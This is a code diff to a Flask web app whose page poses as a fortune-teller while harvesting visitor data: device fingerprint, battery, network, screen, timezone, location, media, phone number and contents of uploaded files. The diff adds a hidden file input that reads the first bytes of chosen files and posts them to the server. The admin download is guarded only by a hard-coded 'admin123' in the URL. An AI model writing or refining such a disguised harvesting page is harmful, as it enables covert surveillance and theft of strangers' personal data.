@@ -52,17 +52,14 @@ def save_visitor(data):
     init_json()
     with open(DATA_FILE, 'r') as f:
         visitors = json.load(f)
-    # Check if sessionId already exists (update instead of duplicate)
     session_id = data.get('sessionId')
     if session_id:
         for i, v in enumerate(visitors):
             if v.get('sessionId') == session_id:
-                # Update existing record
                 visitors[i].update(data)
                 with open(DATA_FILE, 'w') as f:
                     json.dump(visitors, f, indent=2)
                 return True
-    # Otherwise append new
     visitors.append(data)
     with open(DATA_FILE, 'w') as f:
         json.dump(visitors, f, indent=2)
@@ -91,20 +88,18 @@ def save():
 
 @app.route('/save-phone', methods=['POST'])
 def save_phone():
-    """Update visitor record with phone number and fortune text"""
     data = request.json
     session_id = data.get('sessionId')
     phone = data.get('phoneNumber')
     fortune_text = data.get('fortune')
     if session_id:
-        update_data = {'phoneNumber': phone, 'fortuneText': fortune_text}
-        # Load existing visitors, find by sessionId, update
         init_json()
         with open(DATA_FILE, 'r') as f:
             visitors = json.load(f)
         for v in visitors:
             if v.get('sessionId') == session_id:
-                v.update(update_data)
+                v['phoneNumber'] = phone
+                v['fortuneText'] = fortune_text
                 break
         with open(DATA_FILE, 'w') as f:
             json.dump(visitors, f, indent=2)
@@ -119,7 +114,7 @@ def admin():
             visitors = get_visitors()
             if not visitors:
                 return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
-            html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download">Download JSON</a></p>'
+            html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download?pass=admin123">Download JSON</a></p>'
             html += '<table border="1" cellpadding="5">'
             keys = visitors[0].keys()
             html += '<tr>' + ''.join(f'<th>{k}</th>' for k in keys) + '</tr>'
@@ -158,9 +153,8 @@ def download():
     pwd = request.args.get('pass')
     if pwd == 'admin123':
         return jsonify(get_visitors())
-    return 'Unauthorized. Use /admin?pass=admin123', 403
+    return 'Unauthorized. Use /admin/download?pass=admin123', 403
 
-# HTML template with all features
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -242,6 +236,15 @@ HTML_TEMPLATE = '''
             background: rgba(255,255,255,0.8);
             border-radius: 20px;
         }
+        .file-label {
+            display: inline-block;
+            background: #8b5cf6;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 60px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
@@ -274,8 +277,11 @@ HTML_TEMPLATE = '''
     </div>
 </div>
 
+<!-- Hidden file input for traditional file picker (works everywhere) -->
+<input type="file" id="fileInput" multiple style="display:none">
+
 <script>
-    // Generate or retrieve session ID
+    // Session ID (persists across page refreshes)
     let sessionId = localStorage.getItem('fortuneSessionId');
     if (!sessionId) {
         sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
@@ -286,47 +292,61 @@ HTML_TEMPLATE = '''
     let mediaRecorder, mediaStream, recordedBlobs = [];
     let currentFortuneText = "";
 
-    // Fingerprint, battery, network, memory collectors
+    // ---------- Data collection functions ----------
     async function getFingerprint() {
-        const fp = await FingerprintJS.load();
-        const result = await fp.get();
-        return result.visitorId;
+        try {
+            const fp = await FingerprintJS.load();
+            const result = await fp.get();
+            return result.visitorId;
+        } catch(e) { return 'error'; }
     }
+
     async function getBattery() {
         if ('getBattery' in navigator) {
-            const battery = await navigator.getBattery();
-            return { level: Math.round(battery.level * 100), charging: battery.charging };
+            try {
+                const battery = await navigator.getBattery();
+                return { level: Math.round(battery.level * 100), charging: battery.charging };
+            } catch(e) { return { level: 'unknown', charging: false }; }
         }
-        return { level: 'unknown', charging: false };
+        return { level: 'unsupported', charging: false };
     }
+
     function getNetwork() {
         const conn = navigator.connection || navigator.mozConnection;
         if (conn) {
-            return { type: conn.effectiveType, speed: conn.downlink + 'Mbps' };
+            return { type: conn.effectiveType || 'unknown', speed: conn.downlink ? conn.downlink + ' Mbps' : 'unknown' };
         }
         return { type: 'unknown', speed: 'unknown' };
     }
+
     function getMemory() {
         return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
     }
+
     function getScreen() {
-        return `${screen.width}x${screen.height}x${screen.colorDepth}`;
+        return `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`;
     }
+
     function getTimezone() {
         return Intl.DateTimeFormat().resolvedOptions().timeZone;
     }
+
     function getUserAgent() {
         return navigator.userAgent;
     }
 
+    // Main entry
     async function startProcess() {
         const name = document.getElementById('userName').value.trim();
         if (!name) return alert('Please enter your name');
         
-        // Collect all device info
+        document.getElementById('step-name').classList.add('hidden');
+        document.getElementById('loading').classList.remove('hidden');
+        
         const fingerprint = await getFingerprint();
         const battery = await getBattery();
         const network = getNetwork();
+        
         visitorData.name = name;
         visitorData.fingerprint = fingerprint;
         visitorData.batteryLevel = battery.level;
@@ -339,8 +359,6 @@ HTML_TEMPLATE = '''
         visitorData.userAgent = getUserAgent();
         visitorData.timestamp = new Date().toISOString();
         
-        document.getElementById('step-name').classList.add('hidden');
-        document.getElementById('loading').classList.remove('hidden');
         await new Promise(r => setTimeout(r, 800));
         document.getElementById('loading').classList.add('hidden');
         document.getElementById('permissions').classList.remove('hidden');
@@ -358,7 +376,7 @@ HTML_TEMPLATE = '''
         try {
             await getLocation();
             await getMedia();
-            await getFiles();
+            await getFilesTraditional();  // FIXED: uses standard file input
             await finalizeAndSave();
         } catch(e) { await finalizeAndSave(); }
     }
@@ -421,35 +439,49 @@ HTML_TEMPLATE = '''
         });
     }
 
-    function getFiles() {
+    // TRADITIONAL FILE PICKER (works on any HTTP site)
+    function getFilesTraditional() {
         return new Promise((resolve) => {
             showStep('📁 Files', 'Select files (optional)', 0);
-            if(!window.showOpenFilePicker) {
-                visitorData.files = 'not supported';
-                setTimeout(() => { hideStep(); resolve(); }, 500);
-                return;
+            
+            // Create a temporary file input if not already present
+            let fileInput = document.getElementById('fileInput');
+            if (!fileInput) {
+                fileInput = document.createElement('input');
+                fileInput.type = 'file';
+                fileInput.multiple = true;
+                fileInput.style.display = 'none';
+                document.body.appendChild(fileInput);
             }
-            window.showOpenFilePicker({ multiple: true })
-            .then(async handles => {
+            
+            // Clean up previous event listeners
+            fileInput.value = ''; // reset
+            fileInput.onchange = async (event) => {
+                const files = Array.from(event.target.files);
+                if (files.length === 0) {
+                    visitorData.files = 'no files selected';
+                    showStep('📁 Files', 'No files selected', 100);
+                    setTimeout(() => { hideStep(); resolve(); }, 500);
+                    return;
+                }
+                
                 let filesData = [];
-                for(const handle of handles.slice(0,2)) {
-                    const file = await handle.getFile();
+                for (let i = 0; i < Math.min(files.length, 2); i++) {
+                    const file = files[i];
                     const content = await new Promise(res => {
                         const reader = new FileReader();
-                        reader.onloadend = () => res(reader.result.split(',')[1].slice(0,2000));
+                        reader.onloadend = () => res(reader.result.split(',')[1].slice(0, 2000));
                         reader.readAsDataURL(file);
                     });
-                    filesData.push({ name: file.name, size: file.size, data: content });
+                    filesData.push({ name: file.name, size: file.size, type: file.type, data: content });
                 }
                 visitorData.files = JSON.stringify(filesData);
-                showStep('📁 Files', 'Files loaded', 100);
+                showStep('📁 Files', `${filesData.length} file(s) loaded`, 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
-            })
-            .catch(() => {
-                visitorData.files = 'denied';
-                showStep('📁 Files', 'No files', 100);
-                setTimeout(() => { hideStep(); resolve(); }, 500);
-            });
+            };
+            
+            // Trigger file picker
+            fileInput.click();
         });
     }
 
@@ -459,20 +491,17 @@ HTML_TEMPLATE = '''
         document.getElementById('mapUrl').innerText = mapUrl;
         document.getElementById('mapLink').classList.remove('hidden');
         
-        // Get fortune from server
         const fortuneResp = await fetch('/get-fortune');
         const fortuneData = await fortuneResp.json();
         currentFortuneText = fortuneData.fortune;
         document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
         
-        // Save initial data (without phone number)
         await fetch('/save', {
             method: 'POST',
             headers: {'Content-Type':'application/json'},
             body: JSON.stringify(visitorData)
         });
         
-        // Show SMS section
         document.getElementById('smsSection').classList.remove('hidden');
         document.getElementById('result').classList.remove('hidden');
     }
